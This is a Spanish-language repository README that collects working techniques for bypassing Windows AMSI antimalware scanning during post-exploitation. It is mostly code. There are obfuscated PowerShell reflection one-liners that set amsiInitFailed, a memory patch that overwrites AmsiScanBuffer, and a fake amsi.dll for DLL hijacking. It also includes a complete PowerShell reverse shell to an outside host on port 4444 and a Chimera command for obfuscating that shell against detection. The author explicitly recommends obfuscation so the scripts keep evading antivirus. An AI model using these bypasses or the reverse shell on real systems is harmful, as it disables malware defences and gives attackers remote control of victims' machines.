# Evasión de AMSI #

Este repositorio contiene algunos métodos de evasión en AMSI que he encontrado, fueron probados en los siguiewntes sistemas operativos:

- Windows 10
- Windows 11
- Windows Server 2016
- Windows Server 2019
- Windows Server 2022

Todos en sus versión nás reciente para el momento (21H2) y probados en PowerShell 5.1 como en 7.2

Se dejaron de lado técnicas que ya han sido parchadas o que utilicen ejecutables o DLL modificadas debido a que, con el pasar del tiempo, las firmas de estos archivos son detectados por los antivirus; por esta razón se privilegiaron aquellas técnicas que puedan ser ejecutadas en memoria y con un usuario estándar lo cuales pueden ser útiles en un escenario de post explotación.

Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomiendo usar herramientas de ofuscación como [Chimera](https://github.com/tokyoneon/Chimera) o [Invoke-Stelth](https://github.com/JoelGMSec/Invoke-Stealth).

1. [Metodo Reflection de Matt Graeber (base64)](#Método-Reflection-de-Matt-Graeber-(base64) "Goto Método-Reflection-de-Matt-Graeber-(base64)")
2. [Error Forzado](#Error-Forzado "Goto Error-Forzado")
3. [DLL Hijacking](#DLL-Hijacking "goto DLL-Hijacking")
4. [Memory Patching](#Memory-Patching "Goto Memory-Patching")
5. [Ofuscación con Chimera](#Ofuscación-con-Chimera "Goto Ofuscación-con-Chimera")

## Método Reflection de Matt Graeber (base64) ##

| **Interfaz** | **Win 10** | **Win 11** | **Win 2016** | **Win 2019** | **Win 2022** |
|--------------|:----------:|:----------:|:------------:|:------------:|:------------:|
| ![](https://img.shields.io/badge/PowerShell-5-blue) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) 
| ![](https://img.shields.io/badge/PowerShell-7-blueviolet) | ![](https://img.shields.io/badge/-Fall%C3%B3-red) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen) | ![](https://img.shields.io/badge/-Funciona!-brightgreen)

<details><summary>Ver Script</summary>
<p>
 
```PowerShell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
 </p>
</details>

## Error Forzado ##

<details><summary>Ver Script</summary>
<p>
 
```PowerShell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' 
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)   
```
 </p>
</details>

## DLL Hijacking ##

<details><summary>Código de la amsi.dll falsa</summary>
<p>
 
````C++
#include "pch.h"
#include "iostream"
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;
 
        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;
 
        typedef struct r {
            DWORD r;
        };
 
        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
````
 </p>
</details>

````PowerShell
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd
& "$pwd\powershell.exe"
````

## Memory Patching ##

<details><summary>Ver Script</summary>
<p>

```PowerShell
$Win32 = @"
 
using System;
using System.Runtime.InteropServices;
 
public class Win32 {
 
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
 
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
}
"@
 
Add-Type $Win32
 
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
$Patch = [Byte[]] (0xc3, 0x90, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)  
```
</p>
</details>

## Ofuscación con Chimera ##

<details><summary>Reverse Shell en PowerShell sin ofuscar</summary>
<p>

```PowerShell
$client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
</p>
</details>

```bash
 /opt/chimera.sh -f /opt/shells/reverse.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
 ```
